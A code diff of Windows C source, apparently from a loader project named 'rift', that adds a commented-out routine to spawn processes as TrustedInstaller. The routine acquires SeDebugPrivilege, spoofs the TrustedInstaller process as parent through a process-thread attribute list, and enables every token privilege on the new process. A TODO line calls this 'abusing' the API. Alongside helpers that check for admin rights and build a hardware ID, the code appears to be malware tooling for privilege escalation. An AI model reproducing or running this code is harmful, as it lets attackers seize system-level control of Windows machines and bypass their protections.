@@ -1,4 +1,4 @@
-#include "_rift.h"
+#include "_riftldr.h"
 
 BOOL IIsUserAdmin() {
 	PSID pSId;
@@ -283,6 +283,7 @@ VOID IGenerateHardwareId(
 	FreeMemory(smTable);
 }
 
+// TODO implement new method abusing ProcThreadAttributesList
 BOOL ERunAsTrustedInstaller(
 	_In_     PCWSTR szFileName,
 	_In_     PCWSTR szCmdLine,
@@ -333,6 +334,42 @@ BOOL ERunAsTrustedInstaller(
 		CloseHandle(pi.hProcess);
 		CloseHandle(pi.hThread);
 	}
+
+	/*
+	STARTUPINFOEX startupInfo = { 0 };
+	acquireSeDebugPrivilege();
+	// Start the TrustedInstaller service
+	HANDLE hTIPHandle = getTrustedInstallerPHandle();
+	if (hTIPHandle == NULL) {
+		exit(3);
+	}
+	// Initialize STARTUPINFO
+	startupInfo.StartupInfo.cb = sizeof(STARTUPINFOEX);
+	startupInfo.StartupInfo.dwFlags = STARTF_USESHOWWINDOW;
+	startupInfo.StartupInfo.wShowWindow = SW_SHOWNORMAL;
+	// Initialize attribute lists for "parent assignment"
+	size_t attributeListLength;
+	InitializeProcThreadAttributeList(NULL, 1, 0, (PSIZE_T)(size_t*)&attributeListLength);
+	startupInfo.lpAttributeList = (_PROC_THREAD_ATTRIBUTE_LIST*)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, attributeListLength);
+	InitializeProcThreadAttributeList(startupInfo.lpAttributeList, 1, 0, (PSIZE_T)(size_t*)&attributeListLength);
+	UpdateProcThreadAttribute(startupInfo.lpAttributeList, 0, PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, &hTIPHandle, sizeof(HANDLE), NULL, NULL);
+	// Create process
+	PROCESS_INFORMATION processInfo = { 0 };
+	printf("Creating specified process\n");
+	if (CreateProcessA(NULL, lpszImageName, NULL, NULL, FALSE, CREATE_SUSPENDED | EXTENDED_STARTUPINFO_PRESENT | CREATE_NEW_CONSOLE, NULL, NULL, &startupInfo.StartupInfo, &processInfo)) {
+		DeleteProcThreadAttributeList(startupInfo.lpAttributeList);
+		HeapFree(GetProcessHeap(), 0, startupInfo.lpAttributeList);
+		HANDLE hProcessToken;
+		OpenProcessToken(processInfo.hProcess, TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hProcessToken);
+		setAllPrivileges(hProcessToken);
+		printf("Created process ID: %ld and assigned additional token privileges.\n", processInfo.dwProcessId);
+		ResumeThread(processInfo.hThread);
+		//WaitForSingleObject(processInfo.hProcess, INFINITE);
+		CloseHandle(processInfo.hThread);
+		CloseHandle(processInfo.hProcess);
+		return 1;
+	}
+	*/
 
 	return 0;
 }
